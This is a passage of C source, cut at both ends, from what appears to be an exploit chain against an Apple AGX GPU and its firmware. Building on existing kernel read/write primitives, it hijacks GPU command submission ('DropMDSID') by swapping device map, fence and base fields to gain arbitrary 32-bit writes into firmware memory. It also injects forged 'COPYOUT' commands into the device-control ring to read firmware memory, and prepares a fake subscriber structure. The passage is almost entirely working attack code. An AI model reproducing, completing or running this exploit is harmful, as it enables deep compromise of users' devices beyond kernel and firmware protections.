    static const uint8_t expected_map_method[12] = {
        0x5f, 0x24, 0x03, 0xd5, 0xe0, 0x03, 0x01, 0xaa, 0xc0, 0x03, 0x5f, 0xd6,
    };
    uint64_t owner_vtable = strip_pac(owner_vtable_raw);
    uint64_t map_vtable = strip_pac(map_vtable_raw);
    if (!read64(owner_vtable + 0x98, &owner_method_raw) || !read64(map_vtable + 0x220, &map_method_raw) || !read_kernel(strip_pac(owner_method_raw), owner_method, sizeof(owner_method)) ||
        !read_kernel(strip_pac(map_method_raw), map_method, sizeof(map_method)) || memcmp(owner_method, expected_owner_method, sizeof(owner_method)) != 0 ||
        memcmp(map_method, expected_map_method, sizeof(map_method)) != 0) {
        LOG_ERR("DropMDSID method-byte gate failed");
        return false;
    }

    context->target_gfx = owner_base + context->buffer_offset;
    context->target_cpu = cpu_base + context->buffer_offset;
    context->map_vtable = owner_vtable;
    LOG("DropMDSID context port=%#x device=%#llx gpu=%#llx owner=%#llx task=%#llx", context->port, context->device, context->gpu, context->owner, context->firmware_task);
    LOG("DropMDSID scratch gfx=%#llx cpu=%#llx", context->target_gfx, context->target_cpu);
    return true;
}

static bool copyout_entry_free(const uint8_t entry[COPYOUT_STRIDE]) {
    bool zero = true;
    for (size_t index = 0; index < COPYOUT_STRIDE; index++) {
        if (entry[index] != 0) {
            zero = false;
            break;
        }
    }
    if (zero) return true;

    uint64_t pointer = 0;
    uint64_t marker = 0;
    uint64_t state = 0;
    uint64_t references = 0;
    uint32_t tail = 0;
    memcpy(&pointer, entry, sizeof(pointer));
    memcpy(&marker, entry + 8, sizeof(marker));
    memcpy(&state, entry + 0x10, sizeof(state));
    memcpy(&references, entry + 0x18, sizeof(references));
    memcpy(&tail, entry + 0xd0, sizeof(tail));
    return pointer == 0 && references == 0 && tail == 0 && ((marker == 0 && state == 0) || (marker == UINT64_MAX && state == UINT64_C(0x1ffffffff)));
}

static bool snapshot_task_maps(uint64_t task, uint64_t maps[MAX_IOGPU_TASK_MAPS], unsigned* count_out) {
    uint64_t map = 0;
    unsigned count = 0;
    if (!count_out || !read_pointer(task + IOGPU_TASK_MAP_LIST, &map)) return false;
    while (kernel_object_pointer(map) && count < MAX_IOGPU_TASK_MAPS) {
        for (unsigned index = 0; index < count; index++) {
            if (maps[index] == map) return false;
        }
        maps[count++] = map;
        uint64_t next_raw = 0;
        if (!read64(map + IOGPU_MAP_NEXT, &next_raw)) return false;
        map = strip_pac(next_raw);
        if (map == 0) break;
    }
    if (count == MAX_IOGPU_TASK_MAPS) return false;
    *count_out = count;
    return true;
}

static bool find_copyout_output(const drop_context_t* drop, read_context_t* context) {
    uint64_t baseline_maps[MAX_IOGPU_TASK_MAPS] = {};
    unsigned baseline_count = 0;
    command_buffers_t buffers = {};
    struct {
        uint64_t address;
        uint32_t size;
        uint32_t id;
    } shared = {
        .size = PAGE_SIZE_16K,
    };
    if (!snapshot_task_maps(drop->firmware_task, baseline_maps, &baseline_count) || !setup_command_buffers(drop->port, &buffers)) {
        LOG_ERR("GFX read-output command-buffer setup failed");
        return false;
    }
    shared.address = buffers.first_address;
    shared.id = buffers.first_id;
    if (shared.address == 0 || buffers.second_address == 0 || (shared.address & (PAGE_SIZE_16K - 1)) != 0 || (buffers.second_address & (PAGE_SIZE_16K - 1)) != 0) {
        LOG_ERR("GFX read-output allocation failed address=%#llx/%#llx size=%#x id=%u/%u", shared.address, buffers.second_address, shared.size, shared.id, buffers.second_id);
        return false;
    }

    uint64_t map = 0;
    if (!read_pointer(drop->firmware_task + IOGPU_TASK_MAP_LIST, &map)) {
        LOG_ERR("GFX firmware task has no map list");
        return false;
    }

    uint64_t seen[MAX_IOGPU_TASK_MAPS] = {};
    uint64_t matched_map = 0;
    uint64_t matched_gpu = 0;
    uint64_t matched_cpu = 0;
    uint64_t matched_length = 0;
    unsigned matches = 0;
    unsigned new_maps = 0;
    unsigned map_count = 0;
    while (kernel_object_pointer(map) && map_count < MAX_IOGPU_TASK_MAPS) {
        for (unsigned index = 0; index < map_count; index++) {
            if (seen[index] == map) {
                LOG_ERR("GFX firmware map list cycle at %#llx", map);
                return false;
            }
        }
        unsigned position = map_count;
        seen[map_count++] = map;
        if (position < baseline_count && baseline_maps[position] != map) {
            LOG_ERR("GFX firmware map list changed during allocation");
            return false;
        }
        bool is_new = position >= baseline_count;
        if (is_new) new_maps++;

        uint64_t map_vtable_raw = 0;
        uint64_t task = 0;
        uint64_t memory = 0;
        uint64_t accessor = 0;
        uint64_t gpu = 0;
        uint64_t cpu = 0;
        uint64_t length = 0;
        uint64_t capacity = 0;
        uint64_t accessor_length = 0;
        uint64_t granule = 0;
        bool have_vtable = read64(map, &map_vtable_raw);
        bool have_task = read_pointer(map + IOGPU_MAP_TASK, &task);
        bool have_memory = read_pointer(map + IOGPU_MAP_MEMORY, &memory);
        bool have_accessor = have_memory && read_pointer(memory + IOGPU_MEMORY_ACCESSOR, &accessor);
        bool have_gpu = read64(map + IOGPU_MAP_GPU_BASE, &gpu);
        bool have_length = read64(map + IOGPU_MAP_LENGTH, &length);
        bool have_capacity = read64(map + IOGPU_MAP_CAPACITY, &capacity);
        bool have_cpu = have_accessor && read64(accessor + IOGPU_ACCESSOR_CPU_BASE, &cpu);
        bool have_accessor_length = have_accessor && read64(accessor + IOGPU_ACCESSOR_LENGTH, &accessor_length);
        bool have_granule = have_accessor && read64(accessor + IOGPU_ACCESSOR_GRANULE, &granule);
        bool valid = have_vtable && strip_pac(map_vtable_raw) == drop->map_vtable && have_task && task == drop->firmware_task && have_memory && have_accessor && have_gpu && have_length &&
                     have_capacity && have_cpu && have_accessor_length && have_granule && length == shared.size && capacity == length && accessor_length == length && granule == PAGE_SIZE_16K &&
                     kernel_object_pointer(cpu);
        if (is_new) {
            LOG("GFX read-output delta map=%#llx vt=%#llx/%#llx task=%#llx/%#llx memory=%#llx accessor=%#llx gfx=%#llx cpu=%#llx length=%#llx/%#llx accessor-length=%#llx granule=%#llx "
                "flags=%u%u%u%u%u%u%u%u%u%u valid=%u",
                map, strip_pac(map_vtable_raw), drop->map_vtable, task, drop->firmware_task, memory, accessor, gpu, cpu, length, capacity, accessor_length, granule, have_vtable, have_task,
                have_memory, have_accessor, have_gpu, have_length, have_capacity, have_cpu, have_accessor_length, have_granule, valid);
        }
        if (is_new && valid) {
            if (matches == 0) {
                matched_map = map;
                matched_gpu = gpu;
                matched_cpu = cpu;
                matched_length = length;
            }
            matches++;
        }

        uint64_t next_raw = 0;
        if (!read64(map + IOGPU_MAP_NEXT, &next_raw)) return false;
        map = strip_pac(next_raw);
        if (map == 0) break;
    }
    if (map_count == MAX_IOGPU_TASK_MAPS || new_maps != 2 || matches != 2) {
        LOG_ERR("GFX read-output map delta failed before=%u after=%u new=%u valid=%u", baseline_count, map_count, new_maps, matches);
        return false;
    }

    if (matched_gpu < COPYOUT_TABLE || matched_gpu > UINT64_MAX - matched_length) {
        LOG_ERR("GFX read-output coherence gate failed");
        return false;
    }

    uint64_t search_start = matched_gpu + COPYOUT_MIN_OFFSET;
    uint64_t delta = search_start - COPYOUT_TABLE;
    uint64_t index = (delta + COPYOUT_STRIDE - 1) / COPYOUT_STRIDE;
    if (index > UINT32_MAX || index > (UINT64_MAX - COPYOUT_TABLE) / COPYOUT_STRIDE) return false;
    uint64_t entry = COPYOUT_TABLE + index * COPYOUT_STRIDE;
    uint64_t end = matched_gpu + matched_length;
    if (entry < search_start || entry > end - 2 * COPYOUT_STRIDE) {
        LOG_ERR("GFX read-output alignment failed gfx=%#llx length=%#llx entry=%#llx", matched_gpu, matched_length, entry);
        return false;
    }
    uint8_t cleared[2 * COPYOUT_STRIDE] = {};
    uint64_t entry_cpu = matched_cpu + entry - matched_gpu;
    if (!write_kernel(entry_cpu, cleared, sizeof(cleared))) {
        LOG_ERR("GFX read-output initialization failed cpu=%#llx", entry_cpu);
        return false;
    }

    context->output_gpu_base = matched_gpu;
    context->output_cpu_base = matched_cpu;
    context->output_length = matched_length;
    context->output_entries[0] = entry;
    context->output_entries[1] = entry + COPYOUT_STRIDE;
    LOG("GFX read output map=%#llx id=%u/%u gfx=%#llx cpu=%#llx user=%#llx/%#llx entries=%#llx/%#llx", matched_map, shared.id, buffers.second_id, matched_gpu, matched_cpu, shared.address,
        buffers.second_address, context->output_entries[0], context->output_entries[1]);
    return true;
}

static bool resolve_firmware_object(const drop_context_t* drop, read_context_t* context) {
    uint64_t firmware_vtable_raw = 0;
    if (!read_pointer(drop->gpu + 0x548, &context->firmware) || !read64(context->firmware, &firmware_vtable_raw) || strip_pac(firmware_vtable_raw) != AGX_FIRMWARE_G17P_VTABLE + g_ctx.kernel_slide) {
        LOG_ERR("AGX firmware-object gate failed");
        return false;
    }
    return true;
}

static bool resolve_rtbuddy_map(read_context_t* context, uint64_t required_base, uint64_t required_length, uint64_t* physical_out) {
    uint64_t owner = 0;
    uint64_t owner_vtable_raw = 0;
    uint64_t service = 0;
    uint64_t core = 0;
    uint64_t loaded = 0;
    uint64_t segments = 0;
    uint64_t segment_objects = 0;
    uint32_t segment_count = 0;
    if (!read_pointer(context->firmware + RTBUDDY_OWNER_OFFSET, &owner) || !read64(owner, &owner_vtable_raw)) return false;

    uint64_t owner_vtable = strip_pac(owner_vtable_raw);
    uint64_t vtable_start = RTBUDDY_OWNER_VTABLE_START + g_ctx.kernel_slide;
    uint64_t vtable_end = RTBUDDY_OWNER_VTABLE_END + g_ctx.kernel_slide;
    if (owner_vtable < vtable_start || owner_vtable >= vtable_end || !read_pointer(owner + RTBUDDY_PROVIDER_OFFSET, &service) || !read_pointer(service + RTBUDDY_CORE_OFFSET, &core) ||
        !read_pointer(core + RTBUDDY_LOADED_FIRMWARE_OFFSET, &loaded) || !read_pointer(loaded + RTBUDDY_SEGMENTS_OFFSET, &segments) || !read32(segments + 0x14, &segment_count) || segment_count == 0 ||
        segment_count > 64 || !read_pointer(segments + 0x20, &segment_objects))
        return false;

    if (required_length == 0 || required_base > UINT64_MAX - required_length) return false;
    uint64_t required_end = required_base + required_length;
    uint64_t best_gpu = 0;
    uint64_t best_cpu = 0;
    uint64_t best_physical = 0;
    uint64_t best_length = UINT64_MAX;
    uint32_t best_segment = 0;
    uint32_t best_mapping = 0;
    for (uint32_t segment_index = 0; segment_index < segment_count; segment_index++) {
        uint64_t segment = 0;
        uint64_t segment_base = 0;
        uint64_t segment_length = 0;
        uint64_t segment_physical = 0;
        uint64_t descriptor = 0;
        if (!read_pointer(segment_objects + segment_index * sizeof(uint64_t), &segment) || !read64(segment + 0x18, &segment_physical) || !read64(segment + 0x28, &segment_base) ||
            !read64(segment + 0x30, &segment_length) || required_base < segment_base || required_end < required_base || required_end - segment_base > segment_length ||
            !read_pointer(segment + 0x38, &descriptor))
            continue;

        uint64_t mappings = 0;
        uint64_t members = 0;
        uint64_t mapping_objects = 0;
        uint32_t mapping_count = 0;
        uint32_t mapping_capacity = 0;
        if (!read_pointer(descriptor + 0x18, &mappings) || !read_pointer(mappings + 0x18, &members) || !read32(members + 0x18, &mapping_count) || !read32(members + 0x1c, &mapping_capacity) ||
            mapping_count == 0 || mapping_count > mapping_capacity || mapping_count > 64 || !read_pointer(members + 0x20, &mapping_objects))
            continue;

        uint64_t required_offset = required_base - segment_base;
        if (segment_physical > UINT64_MAX - required_offset) continue;
        for (uint32_t mapping_index = 0; mapping_index < mapping_count; mapping_index++) {
            uint64_t mapping = 0;
            uint64_t mapped_descriptor = 0;
            uint64_t mapping_offset = 0;
            uint64_t mapping_address = 0;
            uint64_t mapping_length = 0;
            if (!read_pointer(mapping_objects + mapping_index * sizeof(uint64_t), &mapping) || !read_pointer(mapping + 0x10, &mapped_descriptor) || mapped_descriptor != descriptor ||
                !read64(mapping + 0x20, &mapping_offset) || !read64(mapping + 0x28, &mapping_address) || !read64(mapping + 0x30, &mapping_length) || !kernel_object_pointer(mapping_address) ||
                (mapping_address & (PAGE_SIZE_16K - 1)) != 0 || mapping_offset > segment_length || mapping_length > segment_length - mapping_offset || mapping_length < required_length ||
                required_offset < mapping_offset || required_offset - mapping_offset > mapping_length - required_length)
                continue;
            if (mapping_length < best_length) {
                best_gpu = segment_base + mapping_offset;
                best_cpu = mapping_address;
                best_physical = segment_physical + required_offset;
                best_length = mapping_length;
                best_segment = segment_index;
                best_mapping = mapping_index;
            }
        }
    }
    if (best_length == UINT64_MAX || (physical_out && best_physical == 0)) return false;
    context->output_gpu_base = best_gpu;
    context->output_cpu_base = best_cpu;
    context->output_length = best_length;
    if (physical_out) *physical_out = best_physical;
    LOG("GFX RTBuddy map segment=%u mapping=%u gfx=%#llx cpu=%#llx length=%#llx", best_segment, best_mapping, best_gpu, best_cpu, best_length);
    return true;
}

static bool resolve_read_context(const drop_context_t* drop, read_context_t* context) {
    memset(context, 0, sizeof(*context));
    if (!resolve_firmware_object(drop, context)) return false;

    uint64_t ring = context->firmware + DEVICE_CONTROL_RING_OFFSET;
    uint64_t ring_vtable_raw = 0;
    if (!read64(ring, &ring_vtable_raw) || strip_pac(ring_vtable_raw) != DEVICE_CONTROL_RING_VTABLE + g_ctx.kernel_slide || !read_pointer(ring + 0x08, &context->index_block) ||
        !read_pointer(ring + 0x18, &context->ring_buffer)) {
        LOG_ERR("device-control ring gate failed");
        return false;
    }

    if (!find_copyout_output(drop, context)) return false;
    LOG("GFX copyout ring=%#llx indices=%#llx buffer=%#llx", ring, context->index_block, context->ring_buffer);
    return true;
}

static uint64_t output_alias(const read_context_t* context, uint64_t gfx_address) {
    if (!context->output_cpu_base || gfx_address < context->output_gpu_base || gfx_address - context->output_gpu_base >= context->output_length) return 0;
    return context->output_cpu_base + gfx_address - context->output_gpu_base;
}

static bool output_read(const read_context_t* context, uint64_t gfx_address, void* output, size_t size) {
    uint64_t alias = output_alias(context, gfx_address);
    if (!alias || !output || size == 0 || !output_alias(context, gfx_address + size - 1)) return false;
    return read_kernel(alias, output, size);
}

static bool output_write(const read_context_t* context, uint64_t gfx_address, const void* input, size_t size) {
    uint64_t alias = output_alias(context, gfx_address);
    if (!alias || !input || size == 0 || !output_alias(context, gfx_address + size - 1)) return false;
    return write_kernel(alias, input, size);
}

static bool flush_output_entry(const read_context_t* context, uint64_t entry) {
    __sync_synchronize();
    return entry <= UINT64_MAX - COPYOUT_STRIDE && output_alias(context, entry) && output_alias(context, entry + COPYOUT_STRIDE - 1);
}

static void flush_kernel_cache(uint64_t address, size_t length) {
    sys_dcache_flush((void*)(uintptr_t)address, length);
    __sync_synchronize();
}

static bool wait_for_empty_ring(const read_context_t* context, uint8_t* read_out, uint8_t* write_out) {
    for (unsigned attempt = 0; attempt < 1000; attempt++) {
        uint8_t read_index = 0;
        uint8_t write_index = 0;
        if (!read8(context->index_block, &read_index) || !read8(context->index_block + 0x20, &write_index)) return false;
        if (read_index == write_index) {
            usleep(250);
            uint8_t stable_read = 0;
            uint8_t stable_write = 0;
            if (read8(context->index_block, &stable_read) && read8(context->index_block + 0x20, &stable_write) && stable_read == read_index && stable_write == write_index &&
                stable_read == stable_write) {
                *read_out = stable_read;
                *write_out = stable_write;
                return true;
            }
        }
        if (read_index != write_index) {
            if ((attempt % 10) == 0) {
                uint8_t pulse[64] = {};
                (void)verify_agx_buffer_rw(pulse, sizeof(pulse));
            }
        }
        usleep(1000);
    }
    return false;
}

static bool submit_copyout(const read_context_t* context, uint64_t source, uint64_t entry, uint64_t marker, uint32_t* value, bool* consumed_out, bool verbose) {
    *consumed_out = false;
    if (entry < COPYOUT_TABLE) return false;
    uint64_t delta = entry - COPYOUT_TABLE;
    uint64_t index64 = delta / COPYOUT_STRIDE;
    if (delta % COPYOUT_STRIDE != 0 || index64 > UINT32_MAX) return false;

    uint8_t read_start = 0;
    uint8_t ring_index = 0;
    if (!wait_for_empty_ring(context, &read_start, &ring_index)) {
        LOG_ERR("GFX device-control ring did not become stably empty");
        return false;
    }
    uint8_t command[0x40] = {};
    uint64_t slot = context->ring_buffer + (uint64_t)ring_index * sizeof(command);
    uint8_t next = (uint8_t)(ring_index + 1);
    uint64_t pointer = source - 0x10;
    uint32_t index = (uint32_t)index64;
    uint32_t enter = 1;
    memcpy(command, &(uint32_t){COPYOUT_COMMAND}, sizeof(uint32_t));
    memcpy(command + 0x0c, &marker, sizeof(marker));
    memcpy(command + 0x14, &pointer, sizeof(pointer));
    memcpy(command + 0x30, &index, sizeof(index));
    memcpy(command + 0x34, &enter, sizeof(enter));

    uint64_t line = slot & ~UINT64_C(0x7f);
    uint8_t cache_line[0x80];
    if (!read_kernel(line, cache_line, sizeof(cache_line))) return false;
    memcpy(cache_line + slot - line, command, sizeof(command));
    if (!write_kernel(line, cache_line, sizeof(cache_line))) return false;
    flush_kernel_cache(line, sizeof(cache_line));

    __sync_synchronize();
    if (!write8(context->index_block + 0x20, next)) {
        uint8_t write_after = 0;
        if (!read8(context->index_block + 0x20, &write_after)) {
            return false;
        }
        if (write_after != next) {
            return false;
        }
    }
    flush_kernel_cache((context->index_block + 0x20) & ~UINT64_C(0x3f), 0x40);

    uint8_t submitted[sizeof(command)] = {};
    bool command_intact = read_kernel(slot, submitted, sizeof(submitted)) && memcmp(submitted, command, sizeof(command)) == 0;
    uint8_t pulse[64] = {};
    bool drove_agx = verify_agx_buffer_rw(pulse, sizeof(pulse));

    bool consumed = false;
    bool copied = false;
    uint8_t read_after = read_start;
    uint64_t entry_pointer = 0;
    uint64_t entry_marker = 0;
    uint32_t entry_tail = 0;
    uint8_t target_progress = (uint8_t)(next - read_start);
    for (unsigned poll = 0; poll < 5000; poll++) {
        if (!read8(context->index_block, &read_after)) break;
        uint8_t progress = (uint8_t)(read_after - read_start);
        if (progress >= target_progress) {
            consumed = true;
            for (unsigned visibility = 0; visibility < 1000; visibility++) {
                (void)flush_output_entry(context, entry);
                if (output_read(context, entry, &entry_pointer, sizeof(entry_pointer)) && output_read(context, entry + 8, &entry_marker, sizeof(entry_marker)) && entry_pointer == pointer &&
                    entry_marker == marker) {
                    copied = output_read(context, entry + COPYOUT_RESULT, value, sizeof(*value));
                    (void)output_read(context, entry + 0xd0, &entry_tail, sizeof(entry_tail));
                    break;
                }
                usleep(1000);
            }
            break;
        }
        usleep(1000);
    }
    *consumed_out = consumed;
    if (consumed) {
        uint64_t kernel_alias = output_alias(context, entry);
        uint64_t kernel_pointer = 0;
        uint64_t kernel_marker = 0;
        uint32_t kernel_value = 0;
        if (kernel_alias) {
            (void)read64(kernel_alias, &kernel_pointer);
            (void)read64(kernel_alias + 8, &kernel_marker);
            (void)read32(kernel_alias + COPYOUT_RESULT, &kernel_value);
        }
        LOG("GFX copyout kernel-alias=%#llx entry=%#llx/%#llx/%#x", kernel_alias, kernel_pointer, kernel_marker, kernel_value);
    }
    uint32_t slot_type = 0;
    uint64_t slot_pointer = 0;
    uint32_t slot_index = 0;
    uint32_t slot_enter = 0;
    (void)read32(slot, &slot_type);
    (void)read64(slot + 0x14, &slot_pointer);
    (void)read32(slot + 0x30, &slot_index);
    (void)read32(slot + 0x34, &slot_enter);
    if (verbose) {
        LOG("GFX copyout source=%#llx ring=%u->%u read=%u value=%#x entry=%#llx/%#llx/%#x command=%u intact=%u drive=%u slot=%u/%#llx/%u/%u consumed=%u", source, ring_index, next, read_after, *value,
            entry_pointer, entry_marker, entry_tail, COPYOUT_COMMAND, command_intact, drove_agx, slot_type, slot_pointer, slot_index, slot_enter, consumed);
    }
    return copied;
}

static bool copyout_read64(const read_context_t* context, uint64_t source, uint64_t* value, bool verbose) {
    uint32_t words[2] = {COPYOUT_SENTINEL, COPYOUT_SENTINEL};
    for (unsigned pass = 0; pass < 2; pass++) {
        uint64_t entry = context->output_entries[pass];
        uint8_t original[COPYOUT_STRIDE];
        uint8_t restored[COPYOUT_STRIDE];
        uint64_t marker = UINT64_C(0x22a1000000000000) | (uint64_t)arc4random() | 1;
        if (!flush_output_entry(context, entry) || !output_read(context, entry, original, sizeof(original)) || !copyout_entry_free(original) ||
            !output_write(context, entry + COPYOUT_RESULT, &words[pass], sizeof(words[pass])))
            return false;
        bool consumed = false;
        bool copied = submit_copyout(context, source + 4 * pass, entry, marker, &words[pass], &consumed, verbose);
        bool released =
            consumed && output_write(context, entry, original, sizeof(original)) && output_read(context, entry, restored, sizeof(restored)) && memcmp(restored, original, sizeof(restored)) == 0;
        if (!consumed) LOG_ERR("GFX copyout entry left intact because its command may still be pending");
        if (verbose) LOG("GFX copyout private-entry restore=%u", released);
        if (!copied || !released) return false;
    }
    *value = (uint64_t)words[0] | ((uint64_t)words[1] << 32);
    return true;
}

static bool run_read_at(const drop_context_t* drop, uint64_t source, const char* label, bool verify, uint64_t expected) {
    if (!agx_test_argument_valid(AGX_TEST_READ, source)) {
        LOG_ERR("GFX read requires an aligned main-firmware address in [%#llx, %#llx)", FIRMWARE_START + 0x10, FIRMWARE_END - 0x50);
        return false;
    }
    read_context_t context = {};
    if (!resolve_read_context(drop, &context)) return false;
    uint64_t observed = 0;
    bool copied = copyout_read64(&context, source, &observed, true);
    bool matched = copied && (!verify || observed == expected);
    if (verify) {
        LOG("GFX read %s source=%#llx expected=%#llx observed=%#llx proof=%s", label, source, expected, observed, matched ? "verified" : "failed");
    } else {
        LOG("GFX read %s source=%#llx observed=%#llx proof=%s", label, source, observed, copied ? "copied" : "failed");
    }
    return matched;
}

static bool run_read_control(const drop_context_t* drop) {
    return run_read_at(drop, FIRMWARE_CONTROL_SOURCE, "control", true, FIRMWARE_CONTROL_VALUE);
}

static bool run_read(const drop_context_t* drop, uint64_t source) {
    return run_read_at(drop, source, "requested", false, 0);
}

static bool wait_device_control_idle(const drop_context_t* drop) {
    read_context_t context = {};
    if (!resolve_firmware_object(drop, &context)) return false;

    uint64_t ring = context.firmware + DEVICE_CONTROL_RING_OFFSET;
    uint64_t ring_vtable_raw = 0;
    if (!read64(ring, &ring_vtable_raw) || strip_pac(ring_vtable_raw) != DEVICE_CONTROL_RING_VTABLE + g_ctx.kernel_slide || !read_pointer(ring + 0x08, &context.index_block)) return false;

    unsigned stable = 0;
    for (unsigned attempt = 0; attempt < 5100; attempt++) {
        uint8_t read_index = 0;
        uint8_t write_index = 0;
        if (!read8(context.index_block, &read_index) || !read8(context.index_block + 0x20, &write_index)) return false;
        stable = read_index == write_index ? stable + 1 : 0;
        if (stable >= 2) return true;
        usleep(1000);
    }
    return false;
}

static bool drop_scratch_word(const drop_context_t* context, uint32_t word_offset, uint32_t* observed_out) {
    command_buffers_t buffers = {};
    mdsid_allocation_t allocation = {};
    uint64_t map_field = context->device + 0x158;
    uint64_t fence_field = context->gpu + 0x18120;
    uint64_t offset_field = context->gpu + 0x540;
    uint64_t original_map = 0;
    uint32_t original_fence = 0;
    uint32_t original_offset = 0;
    uint16_t original_entry = 0;
    bool changed_map = false;
    bool changed_entry = false;
    bool changed_fence = false;
    bool changed_offset = false;
    bool written = false;

    if (!setup_command_buffers(context->port, &buffers) || !allocate_mdsid_table(context->ipc_table, context->ipc_count, &allocation) || !read64(map_field, &original_map) ||
        !read32(fence_field, &original_fence) || !read32(offset_field, &original_offset) || !read16(allocation.ranges + 0x200, &original_entry)) {
        goto cleanup;
    }

    changed_map = write64(map_field, allocation.ranges);
    changed_entry = changed_map && write16(allocation.ranges + 0x200, 0x0100);
    changed_fence = changed_entry && write32(fence_field, DROP_MARKER - 0x100);
    changed_offset = changed_fence && write32(offset_field, original_offset + word_offset);
    kern_return_t submit_kr = changed_offset ? submit(context->port, &buffers) : KERN_FAILURE;
    uint32_t counter = 0;
    uint32_t observed = 0;
    bool completed = submit_kr == KERN_SUCCESS && wait_for32(fence_field, DROP_MARKER, &counter);
    bool drained = completed && wait_device_control_idle(context);
    if (drained) usleep(10000);
    written = drained && read32(context->target_cpu + word_offset, &observed) && observed == DROP_MARKER;
    if (observed_out) *observed_out = observed;
    LOG("DropMDSID scratch offset=%#x submit=%#x counter=%#x completed=%u drained=%u observed=%#x written=%u", word_offset, submit_kr, counter, completed, drained, observed, written);

cleanup: {
    bool offset_restored = !changed_offset || write32(offset_field, original_offset);
    bool fence_restored = !changed_fence || write32(fence_field, original_fence);
    bool entry_restored = !changed_entry || write16(allocation.ranges + 0x200, original_entry);
    bool map_restored = !changed_map || write64(map_field, original_map);
    bool restored = offset_restored && fence_restored && entry_restored && map_restored;
    free_mdsid_allocation(&allocation);
    return written && restored;
}
}

static bool run_drop_control(const drop_context_t* context) {
    uint64_t original = 0;
    if (!read64(context->target_cpu, &original) || original != 0) {
        LOG_ERR("DropMDSID scratch is not clean: %#llx", original);
        return false;
    }

    uint32_t high_observed = 0;
    uint32_t low_observed = 0;
    bool high_written = drop_scratch_word(context, sizeof(uint32_t), &high_observed);
    bool low_written = high_written && drop_scratch_word(context, 0, &low_observed);
    uint64_t observed = 0;
    bool proved = high_written && low_written && read64(context->target_cpu, &observed) && observed == DROP_MARKER64;
    bool restored = write64(context->target_cpu, original);
    LOG("DropMDSID control words=%#x/%#x marker=%#llx proof=%s cleanup=%s", high_observed, low_observed, observed, proved ? "verified" : "failed", restored ? "restored" : "failed");
    return proved && restored;
}

typedef struct {
    const drop_context_t* context;
    bool ready;
    unsigned writes;
} drop_writer_t;

static bool drop_writer_end(drop_writer_t* writer) {
    if (!writer) return false;
    memset(writer, 0, sizeof(*writer));
    return true;
}

static bool drop_writer_begin(const drop_context_t* context, drop_writer_t* writer) {
    if (!context || !writer) return false;
    memset(writer, 0, sizeof(*writer));
    writer->context = context;
    writer->ready = true;
    return true;
}

static bool drop_writer_write32(drop_writer_t* writer, uint64_t target, uint32_t value) {
    if (!writer || !writer->ready || !gfx_write_pointer(target)) return false;

    command_buffers_t buffers = {};
    mdsid_allocation_t allocation = {};
    uint64_t map_field = writer->context->device + 0x158;
    uint64_t fence_field = writer->context->gpu + 0x18120;
    uint64_t base_field = writer->context->owner + 0x28;
    uint64_t original_map = 0;
    uint64_t original_base = 0;
    uint32_t original_fence = 0;
    uint16_t original_entry = 0;
    bool changed_map = false;
    bool changed_entry = false;
    bool changed_fence = false;
    bool changed_base = false;
    kern_return_t submit_kr = KERN_FAILURE;
    uint32_t counter = value - 0x100;
    bool completed = false;
    bool drained = false;

    if (!setup_command_buffers(writer->context->port, &buffers) || !allocate_mdsid_table(writer->context->ipc_table, writer->context->ipc_count, &allocation) || !read64(map_field, &original_map) ||
        !read64(base_field, &original_base) || !read32(fence_field, &original_fence) || !read16(allocation.ranges + 0x200, &original_entry))
        goto cleanup;

    changed_map = write64(map_field, allocation.ranges);
    changed_entry = changed_map && write16(allocation.ranges + 0x200, 0x0100);
    changed_fence = changed_entry && write32(fence_field, value - 0x100);
    changed_base = changed_fence && write64(base_field, target - writer->context->buffer_offset);
    submit_kr = changed_base ? submit(writer->context->port, &buffers) : KERN_FAILURE;
    completed = submit_kr == KERN_SUCCESS && wait_for32_attempts(fence_field, value, &counter, 500);
    drained = completed && wait_device_control_idle(writer->context);
    if (drained) {
        writer->writes++;
        usleep(10000);
    } else {
        LOG_ERR("DropMDSID batch target=%#llx value=%#x submit=%#x counter=%#x completed=%u drained=%u", target, value, submit_kr, counter, completed, drained);
    }

cleanup: {
    bool base_restored = !changed_base || write64(base_field, original_base);
    bool fence_restored = !changed_fence || write32(fence_field, original_fence);
    bool entry_restored = !changed_entry || write16(allocation.ranges + 0x200, original_entry);
    bool map_restored = !changed_map || write64(map_field, original_map);
    bool restored = base_restored && fence_restored && entry_restored && map_restored;
    free_mdsid_allocation(&allocation);
    return completed && drained && restored;
}
}

static bool drop_blind_write32(const drop_context_t* context, uint64_t target, uint32_t value) {
    drop_writer_t writer = {};
    bool ready = drop_writer_begin(context, &writer);
    bool written = ready && drop_writer_write32(&writer, target, value);
    unsigned writes = writer.writes;
    bool restored = drop_writer_end(&writer);
    LOG("DropMDSID blind target=%#llx value=%#x writes=%u cleanup=%s", target, value, writes, restored ? "restored" : "failed");
    return written && restored;
}

static const uint64_t signed_event_scratch_words[] = {
    GFX_FAKE_SUBSCRIBER,
    GFX_FAKE_SUBSCRIBER + 8,
    GFX_FAKE_SUBSCRIBER + 0x10,
    GFX_FAKE_SUBSCRIBER + 0x18,
};

typedef struct {
    uint64_t event_array;
    uint32_t pending;
    uint64_t sampler_x20_address;
    uint32_t sampler_x20;
    uint64_t event[4];
    uint64_t scratch[sizeof(signed_event_scratch_words) / sizeof(signed_event_scratch_words[0])];
} signed_event_snapshot_t;

static bool firmware_read64_live(const read_context_t* context, uint64_t address, uint64_t* value) {
    if (!value) return false;
    for (unsigned attempt = 0; attempt < 5; attempt++) {
        if (copyout_read64(context, address, value, false)) {
            usleep(1000);
            return true;
        }
        usleep(10000);
    }
    return false;
}

static bool firmware_read32_live(const read_context_t* context, uint64_t address, uint32_t* value) {
    uint64_t observed = 0;
    if (!value || !firmware_read64_live(context, address, &observed)) return false;
    *value = (uint32_t)observed;
    return true;
}

static bool firmware_read16_live(const read_context_t* context, uint64_t address, uint16_t* value) {
    uint64_t observed = 0;
    uint64_t aligned = address & ~UINT64_C(7);
    unsigned shift = (unsigned)(address - aligned) * 8;
    if (!value || shift > 48 || !firmware_read64_live(context, aligned, &observed)) return false;
    *value = (uint16_t)(observed >> shift);
    return true;
}

static bool firmware_write32_live(drop_writer_t* writer, const read_context_t* context, uint64_t address, uint32_t value) {
    uint32_t observed = 0;
    if (firmware_read32_live(context, address, &observed) && observed == value) return true;
    for (unsigned attempt = 0; attempt < 5; attempt++) {
        bool submitted = drop_writer_write32(writer, address, value);
        if (firmware_read32_live(context, address, &observed) && observed == value) return true;
        if (!submitted) usleep(10000);
    }
    return false;
}

static bool firmware_pulse32(drop_writer_t* writer, uint64_t address, uint32_t value) {
    for (unsigned attempt = 0; attempt < 5; attempt++) {
        if (drop_writer_write32(writer, address, value)) return true;
